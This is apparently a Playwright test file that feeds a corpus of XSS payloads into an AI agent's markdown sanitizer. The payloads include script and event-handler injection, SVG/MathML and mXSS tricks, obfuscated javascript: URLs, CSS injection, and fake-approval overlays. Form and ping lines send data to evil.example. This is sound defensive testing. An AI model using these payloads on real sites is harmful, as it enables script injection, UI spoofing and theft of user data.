import { expect, test } from "@playwright/test";
import { openApp } from "../helpers";
import type { EdgeWindow } from "./edge-helpers";

/**
 * Agent messages are markdown from an LLM that may relay untrusted web content, rendered with
 * marked + DOMPurify. Every payload must come out inert: nothing executes when the output is put in
 * the page, and no dangerous element, attribute or URL survives.
 */
const X = "window.__xss=(window.__xss||0)+1";
const CORPUS: string[] = [
  // Scripts and event handlers.
  `<script>${X}</script>`,
  `<img src=x onerror="${X}">`,
  `<img src="x" onerror=${X}//>`,
  `<IMG SRC=x OnErRoR=${X}>`,
  `<div onmouseover="${X}">hover</div>`,
  `<body onload=${X}>`,
  `<details open ontoggle=${X}>x</details>`,
  `<video><source onerror=${X}></video>`,
  `<audio src=x onerror=${X}>`,
  `<input autofocus onfocus=${X}>`,
  `<marquee onstart=${X}>x</marquee>`,
  `<a href="#" onclick="${X}">click</a>`,
  // SVG and MathML.
  `<svg onload=${X}>`,
  `<svg><script>${X}</script></svg>`,
  `<svg><animate onbegin=${X} attributeName=x dur=1s></svg>`,
  `<svg><a xlink:href="javascript:${X}"><text x=0 y=20>x</text></a></svg>`,
  `<svg><foreignObject><iframe srcdoc="<script>parent.__xss=1</script>"></iframe></foreignObject></svg>`,
  `<math><mtext><table><mglyph><style><img src=x onerror=${X}>`,
  `<math href="javascript:${X}">CLICK</math>`,
  `<math><maction actiontype="statusline#" xlink:href="javascript:${X}">x</maction></math>`,
  // Frames, objects, embeds.
  `<iframe src="javascript:${X}"></iframe>`,
  `<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>`,
  `<object data="javascript:${X}"></object>`,
  `<embed src="javascript:${X}">`,
  `<object data="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuX194c3M9MTwvc2NyaXB0Pg=="></object>`,
  `<frameset><frame src="javascript:${X}"></frameset>`,
  // mXSS and parser differentials.
  `<noscript><p title="</noscript><img src=x onerror=${X}>">`,
  `<template><img src=x onerror=${X}></template>`,
  `<textarea><img src=x onerror=${X}></textarea>`,
  `<title><img src=x onerror=${X}></title>`,
  `<!--><img src=x onerror=${X}>-->`,
  // CSS.
  `<div style="background:url(javascript:${X})">x</div>`,
  `<div style="width:expression(${X})">x</div>`,
  `<style>@import 'javascript:${X}';</style>`,
  `<link rel=stylesheet href="javascript:${X}">`,
  // Page takeover: base, meta refresh, forms.
  `<base href="https://evil.example/">`,
  `<meta http-equiv="refresh" content="0;url=javascript:${X}">`,
  `<form action="https://evil.example"><input name=card><button>Pay</button></form>`,
  `<button formaction="javascript:${X}">Pay</button>`,
  `<input type=image src=x formaction="javascript:${X}">`,
  `<select><option>a</option></select><textarea>b</textarea>`,
  // javascript:, vbscript:, data: URLs with case, whitespace, control characters and entities.
  `[a](javascript:${X})`,
  `[a](JaVaScRiPt:${X})`,
  `[a](  javascript:${X})`,
  `[a](&#106;avascript:${X})`,
  `[a](&#x6A;avascript:${X})`,
  `[a](javascript&colon;${X})`,
  `[a](vbscript:msgbox(1))`,
  "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  `[a][ref]\n\n[ref]: javascript:${X}`,
  `![a](javascript:${X})`,
  `<javascript:${X}>`,
  `<a href="javascript:${X}">a</a>`,
  `<a href="jav&#x09;ascript:${X}">a</a>`,
  `<a href="jav&#x0A;ascript:${X}">a</a>`,
  `<a href=" &#14; javascript:${X}">a</a>`,
  `<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058${X}">a</a>`,
  `<a href="data:text/html,<script>${X}</script>">a</a>`,
  `<a href="vbscript:msgbox(1)">a</a>`,
  // Links must open in a new tab without an opener.
  `<a href="https://example.com" target="_self" rel="opener">a</a>`,
  `<a href="https://example.com" ping="https://evil.example/track">a</a>`,
  // UI redress: agent content must not escape its message box or spoof app chrome.
  `<div style="position:fixed;inset:0;z-index:99999;background:#fff">Approve?</div>`,
  `<a href="https://evil.example" style="position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0">x</a>`,
  `<div class="approval-card toast" id="root">spoof</div>`,
];

const DANGEROUS_TAGS = new Set([
  "SCRIPT",
  "IFRAME",
  "FRAME",
  "FRAMESET",
  "OBJECT",
  "EMBED",
  "BASE",
  "META",
  "LINK",
  "STYLE",
  "FORM",
  "BUTTON",
  "TEXTAREA",
  "SELECT",
  "SVG",
  "MATH",
  "TEMPLATE",
  "NOSCRIPT",
]);

test.describe("agent markdown sanitizer (XSS corpus)", () => {
  test("every payload renders inert, links open safely, nothing escapes the message", async ({
    page,
  }) => {
    const dialogs: string[] = [];
    page.on("dialog", (dialog) => {
      dialogs.push(dialog.message());
      void dialog.dismiss();
    });
    await openApp(page);
    const outputs = await page.evaluate(async (corpus) => {
      const debug = (window as unknown as EdgeWindow).__ddlDebug;
      const html: string[] = [];
      for (const source of corpus) html.push(await debug.renderMarkdown(source));
      // Put everything in the live page so load/error/toggle handlers would fire.
      const host = document.createElement("div");
      host.className = "markdown";
      host.innerHTML = html.join("\n");
      document.body.append(host);
      return html;
    }, CORPUS);
    await page.waitForTimeout(300);
    expect(await page.evaluate(() => (window as { __xss?: number }).__xss ?? 0)).toBe(0);
    expect(dialogs).toEqual([]);

    const problems = await page.evaluate(
      ({ outputs, dangerous }) => {
        const found: string[] = [];
        const urlAttrs = ["href", "src", "action", "formaction", "xlink:href", "data", "poster"];
        outputs.forEach((html, i) => {
          const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
          for (const el of doc.body.querySelectorAll("*")) {
            const where = `#${i} <${el.tagName.toLowerCase()}>`;
            if (dangerous.includes(el.tagName.toUpperCase())) found.push(`${where} tag`);
            for (const attr of el.attributes) {
              const name = attr.name.toLowerCase();
              // Browsers ignore spaces and control characters inside URL schemes.
              const value = [...attr.value]
                .filter((c) => c > " ")
                .join("")
                .toLowerCase();
              if (name.startsWith("on")) found.push(`${where} ${name}`);
              if (["style", "class", "id", "ping", "srcdoc", "formaction"].includes(name)) {
                found.push(`${where} ${name}="${attr.value}"`);
              }
              if (urlAttrs.includes(name) && /^(javascript|vbscript|data):/.test(value)) {
                if (!(el.tagName === "IMG" && value.startsWith("data:image/"))) {
                  found.push(`${where} ${name}=${attr.value}`);
                }
              }
            }
            if (
              el.tagName === "A" &&
              el.getAttribute("href") &&
              !el.getAttribute("href")!.startsWith("#")
            ) {
              if (el.getAttribute("target") !== "_blank") found.push(`${where} target`);
              const rel = (el.getAttribute("rel") ?? "").split(/\s+/);
              if (!rel.includes("noopener") || !rel.includes("noreferrer"))
                found.push(`${where} rel`);
            }
          }
        });
        return found;
      },
      { outputs, dangerous: [...DANGEROUS_TAGS] },
    );
    expect(problems).toEqual([]);
  });

  test("ordinary agent markdown still renders", async ({ page }) => {
    await openApp(page);
    const html = await page.evaluate(
      (source) => (window as unknown as EdgeWindow).__ddlDebug.renderMarkdown(source),
      [
        "## Options",
        "",
        "| Model | Price |",
        "| :--- | ---: |",
        "| A | $129 |",
        "",
        "- [x] compared prices",
        "- [ ] order",
        "",
        "```ts",
        "const x = 1;",
        "```",
        "",
        "See [the guide](https://guide.example/a?b=1#c) and ![chart](https://img.example/c.png).",
      ].join("\n"),
    );
    expect(html).toContain("<h2>Options</h2>");
    expect(html).toContain("<table>");
    expect(html).toContain('type="checkbox"');
    expect(html).toContain("<pre><code");
    expect(html).toContain('href="https://guide.example/a?b=1#c"');
    expect(html).toContain('src="https://img.example/c.png"');
  });
});
